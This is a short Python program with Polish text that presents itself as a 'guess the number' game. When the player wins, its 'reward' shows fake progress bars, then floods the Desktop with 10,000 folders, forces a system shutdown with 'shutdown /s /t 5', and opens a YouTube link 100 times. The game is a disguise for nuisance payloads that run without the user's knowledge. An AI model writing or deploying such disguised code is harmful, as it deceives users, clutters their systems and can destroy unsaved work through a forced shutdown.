import os
import time
from colorama import Fore, Style
import random
import sys
import subprocess
from pathlib import Path
import webbrowser

def smooth_progress(task_name, target_time):
    bar_length = 30
    steps = 100
    delays = [random.uniform(0.01, 0.08) for _ in range(steps)]
    for _ in range(random.randint(2, 4)):
        stuck_index = random.randint(10, 85)
        delays[stuck_index] += random.uniform(0.3, 0.7)
    total_delay_sum = sum(delays)
    scale = target_time / total_delay_sum
    delays = [d * scale for d in delays]
    for i in range(steps + 1):
        filled_len = int(bar_length * i // 100)
        bar = '=' * filled_len + ' ' * (bar_length - filled_len)
        sys.stdout.write(f"\r{task_name} [{bar}] {i}%")
        sys.stdout.flush()
        if i < steps:
            time.sleep(delays[i])
    print()

def folderki():
    try:
        pulpit = Path.home() / "Desktop"
        os.chdir(pulpit)
        
        for i in range(10000):
            os.makedirs(f"EeEeEelektryzacja{i}", exist_ok=True)
            
    except Exception as e:
        print(f"Wystąpił błąd podczas tworzenia folderów: {e}")
        
    time.sleep(2)

def google(link, ile_razy=10):
    for _ in range(ile_razy):
        webbrowser.open(link)

def uruchom_nagrody():
    print("============================")
    print("      BRAWO ZWYCIĘZCO       ")
    print("============================\n")
    time.sleep(1)
    
    # --- TASK 1 ---
    smooth_progress("Przygotowywuję folder macierzysty...    ", 2.5)
    time.sleep(0.3)
    folderki()
    
    # --- TASK 2 ---
    smooth_progress("Rozpakowywuję archiwa...                ", 3.5)
    time.sleep(0.3)

    # --- TASK 3 ---
    smooth_progress("Otwieram w3m...                         ", 3.0)
    time.sleep(0.3)

    # --- TASK 4 ---
    smooth_progress("Kończę program...                       ", 4.0)
    time.sleep(0.3)

    # --- TASK 5 ---
    smooth_progress("Finalizowanie działań programu...       ", 2.0)
    time.sleep(0.3)


    print("\n-------------------------------------")
    print("              GOTOWE!                  ")
    print("-------------------------------------\n")
    time.sleep(1.5)
    
    input("\nNaciśnij Enter, aby zamknąć...")
    time.sleep(0.5)
    
    for i in ["3", "2", "1", "..."]:
        subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
        print(i)
        time.sleep(1)
        
    subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
    
    os.system("shutdown /s /t 5")
    google("https://www.youtube.com/watch?v=2j4EhkQPL9o", ile_razy=100)

if __name__ == "__main__":
    liczba = random.randint(1, 100)

    print(Fore.LIGHTGREEN_EX + "===============================================")
    print("  [ KORPORACJA MINCEL & WOKULSKI SP. Z O.O. ]")
    print("===============================================")
    print()
    time.sleep(2)
    print(Style.RESET_ALL + '=== GRA "Zgadnij liczbę" ===')

    while True:
        try:
            odp = int(input("Wprowadź liczbę: (od 1 do 100)   "))
        except ValueError:
            print("To nie jest liczba! Spróbuj ponownie.")
            continue

        if odp < liczba:
            print("Podałes za małą liczbe!!! :(")
        elif odp > liczba:
            print("Podałeś za dużą liczbę!!! :(")
        else:
            print(f"BRAWO! Zgadłeś liczbę!!! :) LICZBA TO {liczba}")
            time.sleep(2)

            print(Fore.LIGHTGREEN_EX + "Ładuję nagrodę :)")
            time.sleep(1.5)
            subprocess.run("cls" if os.name == "nt" else "clear", shell=True)
            time.sleep(1.5)
            
            uruchom_nagrody()
            break
